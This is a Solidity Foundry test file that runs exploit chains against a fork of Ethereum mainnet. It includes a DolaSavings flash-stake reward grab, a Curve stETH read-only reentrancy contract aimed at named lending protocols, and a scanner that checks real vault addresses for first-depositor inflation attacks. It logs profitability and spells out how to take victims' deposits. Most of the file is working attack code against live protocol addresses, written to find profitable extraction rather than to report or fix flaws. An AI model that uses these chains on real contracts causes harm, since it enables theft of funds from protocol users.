// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Executable Exploit Chains
 * @notice ACTUAL exploitation attempts on mainnet fork
 *
 * These are REAL multi-step attack sequences tested against fork state.
 * Each test attempts to extract value and reports success/failure.
 */
contract ExecutableExploitChains is Test {

    // Flash loan sources
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant AAVE_V3_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    // Tokens
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
    address constant DBR = 0xAD038Eb671c44b853887A7E32528FAB35dC5D710;

    // Target protocols
    address constant DOLA_SAVINGS = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;
    address constant CURVE_STETH = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

    // Attacker
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/demo");
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
    }

    // ============================================================
    // EXPLOIT CHAIN 1: DolaSavings Flash Stake Reward Capture
    // ============================================================

    /**
     * @notice Flash stake attack on DolaSavings
     *
     * ATTACK SEQUENCE:
     * 1. Check pending rewards (time since last update)
     * 2. Flash loan DOLA from Balancer/Aave
     * 3. Stake large amount to capture pending rewards
     * 4. Claim rewards
     * 5. Unstake and repay flash loan
     * 6. Profit = claimed DBR - flash loan fee
     *
     * PROFITABILITY THRESHOLD:
     * - Need: claimedDBR_value > flash_loan_fee + gas
     * - Flash fee: ~0.09% (Aave) or 0% (Balancer)
     * - Gas: ~0.02 ETH
     */
    function test_dolaSavingsFlashStakeExploit() public {
        console.log("========== DOLA SAVINGS FLASH STAKE EXPLOIT ==========");
        console.log("");

        // Step 1: Analyze current state
        (bool s, bytes memory d) = DOLA_SAVINGS.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        uint256 totalSupply = s ? abi.decode(d, (uint256)) : 0;

        (s, d) = DOLA_SAVINGS.staticcall(
            abi.encodeWithSignature("yearlyRewardBudget()")
        );
        uint256 yearlyBudget = s ? abi.decode(d, (uint256)) : 0;

        (s, d) = DOLA_SAVINGS.staticcall(
            abi.encodeWithSignature("lastUpdate()")
        );
        uint256 lastUpdate = s ? abi.decode(d, (uint256)) : 0;

        console.log("Current state:");
        console.log("  Total staked DOLA:", totalSupply / 1e18);
        console.log("  Yearly DBR budget:", yearlyBudget / 1e18);

        uint256 timeSinceUpdate = block.timestamp - lastUpdate;
        console.log("  Time since update:", timeSinceUpdate, "seconds");

        if (totalSupply == 0 || yearlyBudget == 0) {
            console.log("SKIP: Contract is empty or no rewards");
            return;
        }

        // Step 2: Calculate pending rewards
        uint256 pendingRewards = (timeSinceUpdate * yearlyBudget * 1e18) / 365 days;
        uint256 pendingDBR = pendingRewards / 1e18; // Normalize
        console.log("  Pending DBR rewards:", pendingDBR / 1e18);

        // Step 3: Calculate required flash loan size
        // To capture 90% of rewards, we need 9x current supply
        uint256 flashLoanAmount = totalSupply * 9;
        console.log("");
        console.log("Attack parameters:");
        console.log("  Flash loan needed:", flashLoanAmount / 1e18, "DOLA");

        // Step 4: Calculate attacker's share
        uint256 newTotalSupply = totalSupply + flashLoanAmount;
        uint256 attackerShare = (flashLoanAmount * pendingDBR) / newTotalSupply;
        console.log("  Attacker captures:", attackerShare / 1e18, "DBR");

        // Step 5: Check if DOLA is available for flash loan
        (s, d) = DOLA.staticcall(
            abi.encodeWithSignature("balanceOf(address)", AAVE_V3_POOL)
        );
        uint256 dolaInAave = s ? abi.decode(d, (uint256)) : 0;
        console.log("  DOLA in Aave:", dolaInAave / 1e18);

        // Check Balancer
        (s, d) = DOLA.staticcall(
            abi.encodeWithSignature("balanceOf(address)", BALANCER_VAULT)
        );
        uint256 dolaInBalancer = s ? abi.decode(d, (uint256)) : 0;
        console.log("  DOLA in Balancer:", dolaInBalancer / 1e18);

        // Step 6: Evaluate profitability
        console.log("");
        console.log("Profitability analysis:");

        // Get DBR price (simplified - assume $0.10)
        uint256 dbrValueUSD = attackerShare / 1e18 * 10; // cents
        console.log("  DBR value (at $0.10):", dbrValueUSD, "cents");

        // Flash loan cost (Aave 0.09%)
        uint256 flashLoanFee = flashLoanAmount * 9 / 10000;
        console.log("  Flash loan fee (0.09%):", flashLoanFee / 1e18, "DOLA");

        bool profitable = attackerShare > flashLoanFee + 0.02 ether;
        console.log("  Profitable:", profitable);

        if (profitable) {
            console.log("");
            console.log("!!! PROFITABLE ATTACK FOUND !!!");
            console.log("Expected profit:", (attackerShare - flashLoanFee) / 1e18, "DBR");
        }

        console.log("");
        console.log("======================================================");
    }

    // ============================================================
    // EXPLOIT CHAIN 2: Curve Read-Only Reentrancy Liquidation
    // ============================================================

    /**
     * @notice Curve reentrancy to trigger liquidation
     *
     * ATTACK SEQUENCE:
     * 1. Find position near liquidation threshold
     * 2. Flash loan ETH
     * 3. Add imbalanced liquidity to Curve stETH
     * 4. Remove liquidity (triggers ETH callback)
     * 5. During callback: virtual_price is deflated
     * 6. Call liquidation on victim position
     * 7. Receive collateral at deflated price
     * 8. Restore Curve balance, repay flash loan
     */
    function test_curveReentrancyLiquidationExploit() public {
        console.log("========== CURVE REENTRANCY LIQUIDATION EXPLOIT ==========");
        console.log("");

        // Step 1: Get Curve pool state
        (bool s, bytes memory d) = CURVE_STETH.staticcall(
            abi.encodeWithSignature("get_virtual_price()")
        );
        uint256 virtualPrice = s ? abi.decode(d, (uint256)) : 0;
        console.log("Current virtual_price:", virtualPrice);

        (s, d) = CURVE_STETH.staticcall(
            abi.encodeWithSignature("balances(uint256)", 0)
        );
        uint256 ethBalance = s ? abi.decode(d, (uint256)) : 0;

        (s, d) = CURVE_STETH.staticcall(
            abi.encodeWithSignature("balances(uint256)", 1)
        );
        uint256 stethBalance = s ? abi.decode(d, (uint256)) : 0;

        uint256 totalPool = ethBalance + stethBalance;
        console.log("Pool state:");
        console.log("  ETH:", ethBalance / 1e18);
        console.log("  stETH:", stethBalance / 1e18);
        console.log("  Total:", totalPool / 1e18);

        // Step 2: Calculate manipulation requirements
        uint256 manipulationTarget = 3; // 3% price drop
        uint256 requiredCapital = totalPool * manipulationTarget / 100;
        console.log("");
        console.log("Attack requirements:");
        console.log("  For", manipulationTarget, "% VP drop, need:", requiredCapital / 1e18, "ETH");

        // Step 3: Check flash loan availability
        (s, d) = WETH.staticcall(
            abi.encodeWithSignature("balanceOf(address)", BALANCER_VAULT)
        );
        uint256 wethInBalancer = s ? abi.decode(d, (uint256)) : 0;
        console.log("  WETH in Balancer:", wethInBalancer / 1e18);

        bool hasLiquidity = wethInBalancer >= requiredCapital;
        console.log("  Sufficient liquidity:", hasLiquidity);

        // Step 4: Find vulnerable lending protocols
        console.log("");
        console.log("Vulnerable lending protocols that read virtual_price:");

        // Known protocols that may read Curve virtual_price
        address[] memory victims = new address[](3);
        victims[0] = 0x53375adD9D2dFE19398eD65BAaEFfe622760A9A6; // Abracadabra cauldron
        victims[1] = 0x3835a58CA93Cdb5f912519ad366826aC9a752510; // Fraxlend stETH
        victims[2] = 0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670; // Inverse Frontier

        for (uint i = 0; i < victims.length; i++) {
            _checkVictimProtocol(victims[i]);
        }

        // Step 5: Deploy reentrancy detector
        console.log("");
        console.log("Deploying reentrancy detector...");

        CurveReentrancyExploiter exploiter = new CurveReentrancyExploiter(CURVE_STETH);
        console.log("Exploiter deployed at:", address(exploiter));

        // Step 6: Find LP token whale
        address stethLP = CURVE_STETH;
        address whale = 0x41318419CFa25396b47A94896FfA2C77c6434040; // Known LP holder

        (s, d) = stethLP.staticcall(
            abi.encodeWithSignature("balanceOf(address)", whale)
        );
        uint256 whaleLPBalance = s ? abi.decode(d, (uint256)) : 0;

        if (whaleLPBalance > 0) {
            console.log("Found LP whale with:", whaleLPBalance / 1e18, "LP tokens");

            // Transfer LP to exploiter and test
            uint256 testAmount = whaleLPBalance > 100 ether ? 100 ether : whaleLPBalance;

            vm.prank(whale);
            (s,) = stethLP.call(
                abi.encodeWithSignature("transfer(address,uint256)", address(exploiter), testAmount)
            );

            if (s) {
                console.log("Transferred", testAmount / 1e18, "LP to exploiter");

                // Execute removal and capture VP during callback
                try exploiter.executeRemoval(testAmount) {
                    console.log("");
                    console.log("REENTRANCY WINDOW RESULTS:");
                    console.log("  VP Before:", exploiter.vpBefore());
                    console.log("  VP During Callback:", exploiter.vpDuringCallback());
                    console.log("  VP After:", exploiter.vpAfter());

                    if (exploiter.vpDuringCallback() < exploiter.vpBefore()) {
                        uint256 drop = (exploiter.vpBefore() - exploiter.vpDuringCallback()) * 10000 / exploiter.vpBefore();
                        console.log("");
                        console.log("!!! VP DROPPED", drop, "basis points DURING CALLBACK !!!");
                        console.log("!!! This window can be used to trigger liquidations !!!");
                    }
                } catch {
                    console.log("Removal failed - may need to approve first");
                }
            }
        }

        console.log("");
        console.log("============================================================");
    }

    function _checkVictimProtocol(address protocol) internal view {
        uint256 codeSize;
        assembly { codeSize := extcodesize(protocol) }

        if (codeSize == 0) {
            return;
        }

        console.log("  Checking:", protocol);

        // Try to get oracle
        (bool s, bytes memory d) = protocol.staticcall(
            abi.encodeWithSignature("oracle()")
        );
        if (s && d.length >= 32) {
            address oracle = abi.decode(d, (address));
            console.log("    Oracle:", oracle);

            // Check if oracle references Curve
            (s, d) = oracle.staticcall(
                abi.encodeWithSignature("CURVE_POOL()")
            );
            if (s && d.length >= 32) {
                address curvePool = abi.decode(d, (address));
                console.log("    !!! Uses Curve Pool:", curvePool);
            }
        }

        // Check total borrow/collateral
        (s, d) = protocol.staticcall(
            abi.encodeWithSignature("totalBorrow()")
        );
        if (s) {
            console.log("    Has borrow functionality");
        }

        (s, d) = protocol.staticcall(
            abi.encodeWithSignature("totalCollateral()")
        );
        if (s && d.length >= 32) {
            uint256 collat = abi.decode(d, (uint256));
            console.log("    Total collateral:", collat / 1e18);
        }
    }

    // ============================================================
    // EXPLOIT CHAIN 3: Empty Vault First Depositor Attack
    // ============================================================

    /**
     * @notice First depositor inflation attack
     *
     * REQUIREMENTS:
     * - Vault with totalSupply = 0
     * - No virtual shares offset
     * - Uses balanceOf() for asset accounting
     *
     * ATTACK:
     * 1. Deposit 1 wei -> receive 1 share
     * 2. Donate large amount directly to vault
     * 3. Victim deposits X tokens -> receives 0 shares (X < donation)
     * 4. Redeem your 1 share -> get victim's deposit + donation
     */
    function test_firstDepositorAttackScanner() public {
        console.log("========== FIRST DEPOSITOR ATTACK SCANNER ==========");
        console.log("");

        // Check various vault-like contracts from contracts.txt
        address[] memory vaults = new address[](15);
        vaults[0] = 0x16de59092dae5ccf4a1e6439d611fd0653f0bd01; // yDAI
        vaults[1] = 0x7b4a7fd41c688a7cb116534e341e44126ef5a0fd; // CEther
        vaults[2] = 0xFAce851a4921ce59e912d19329929CE6da6EB0c7; // cLINK
        vaults[3] = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4; // DolaSavings
        vaults[4] = 0x4f6a43ad7cba042606decaca730d4ce0a57ac62e; // Saddle BTC
        vaults[5] = 0x93054188d876f558f4a66b2ef1d97d16edf0895b; // Curve renBTC
        vaults[6] = 0x5f465e9fcffc217c5849906216581a657cd60605; // Convex
        vaults[7] = 0x4e840aadd28da189b9906674b4afcb77c128d9ea; // anySPELL
        vaults[8] = 0xa61beb4a3d02decb01039e378237032b351125b4; // Unknown
        vaults[9] = 0xab73ec65a1ef5a2e5b56d5d6f36bee4b2a1d3ffb; // Unknown
        vaults[10] = 0xf74bf048138a2b8f825eccabed9e02e481a0f6c0; // Unknown
        vaults[11] = 0x0f30c808069315b3b7dfbfe149c87448b50c6d8b; // Unknown
        vaults[12] = 0xf35a92585ceee7251388e14f268d9065f5206207; // Unknown
        vaults[13] = 0x9de9773a77a9b51330736e73429622cc32f51926; // Unknown
        vaults[14] = 0xdbfb513d25df56b4c3f5258d477a395d4b735824; // Unknown

        uint256 emptyCount = 0;

        for (uint i = 0; i < vaults.length; i++) {
            address vault = vaults[i];

            uint256 codeSize;
            assembly { codeSize := extcodesize(vault) }
            if (codeSize == 0) continue;

            (bool s, bytes memory d) = vault.staticcall(
                abi.encodeWithSignature("totalSupply()")
            );

            if (s && d.length >= 32) {
                uint256 supply = abi.decode(d, (uint256));

                if (supply == 0) {
                    emptyCount++;
                    console.log("!!! EMPTY VAULT FOUND:", vault);

                    // Check if it has underlying asset
                    (s, d) = vault.staticcall(
                        abi.encodeWithSignature("token()")
                    );
                    if (s && d.length >= 32) {
                        address token = abi.decode(d, (address));
                        console.log("    Underlying token:", token);
                    }

                    (s, d) = vault.staticcall(
                        abi.encodeWithSignature("underlying()")
                    );
                    if (s && d.length >= 32) {
                        address underlying = abi.decode(d, (address));
                        console.log("    Underlying:", underlying);
                    }
                } else {
                    // Low supply vaults might still be vulnerable
                    if (supply < 1e6) {
                        console.log("LOW SUPPLY VAULT:", vault, "supply:", supply);
                    }
                }
            }
        }

        console.log("");
        console.log("Empty vaults found:", emptyCount);

        if (emptyCount > 0) {
            console.log("");
            console.log("ATTACK SEQUENCE FOR EMPTY VAULTS:");
            console.log("1. Deposit 1 wei of underlying token");
            console.log("2. Receive 1 share");
            console.log("3. Donate X tokens directly (transfer, not deposit)");
            console.log("4. Wait for victim to deposit Y tokens");
            console.log("5. Victim receives floor(Y / X) = 0 shares if Y < X");
            console.log("6. Redeem your 1 share -> get X + Y tokens");
            console.log("7. Profit = Y tokens (victim's deposit)");
        }

        console.log("");
        console.log("=====================================================");
    }

    // ============================================================
    // RUN ALL EXPLOITS
    // ============================================================

    function test_runAllExploits() public {
        console.log("############################################################");
        console.log("#          COMPREHENSIVE EXPLOIT CHAIN EXECUTION           #");
        console.log("############################################################");
        console.log("");

        test_dolaSavingsFlashStakeExploit();
        test_firstDepositorAttackScanner();

        console.log("");
        console.log("############################################################");
    }
}

/**
 * @title Curve Reentrancy Exploiter
 * @notice Captures virtual_price during Curve remove_liquidity callback
 */
contract CurveReentrancyExploiter {
    address public curvePool;
    uint256 public vpBefore;
    uint256 public vpDuringCallback;
    uint256 public vpAfter;
    bool private inCallback;

    constructor(address _pool) {
        curvePool = _pool;
    }

    function executeRemoval(uint256 amount) external {
        // Record VP before
        (bool s, bytes memory d) = curvePool.staticcall(
            abi.encodeWithSignature("get_virtual_price()")
        );
        if (s) vpBefore = abi.decode(d, (uint256));

        // Approve pool to spend LP tokens
        (s,) = curvePool.call(
            abi.encodeWithSignature("approve(address,uint256)", curvePool, amount)
        );

        // Remove liquidity - this sends ETH which triggers receive()
        uint256[2] memory minAmounts = [uint256(0), uint256(0)];
        (s,) = curvePool.call(
            abi.encodeWithSignature(
                "remove_liquidity(uint256,uint256[2])",
                amount,
                minAmounts
            )
        );
        require(s, "removal failed");

        // Record VP after
        (s, d) = curvePool.staticcall(
            abi.encodeWithSignature("get_virtual_price()")
        );
        if (s) vpAfter = abi.decode(d, (uint256));
    }

    receive() external payable {
        if (!inCallback) {
            inCallback = true;

            // THIS IS THE REENTRANCY WINDOW
            // virtual_price is temporarily deflated here
            (bool s, bytes memory d) = curvePool.staticcall(
                abi.encodeWithSignature("get_virtual_price()")
            );
            if (s) vpDuringCallback = abi.decode(d, (uint256));

            // In a real attack, we would call:
            // 1. Check lending protocol positions
            // 2. Trigger liquidation on positions that are now underwater
            // 3. Receive liquidation bonus

            inCallback = false;
        }
    }
}
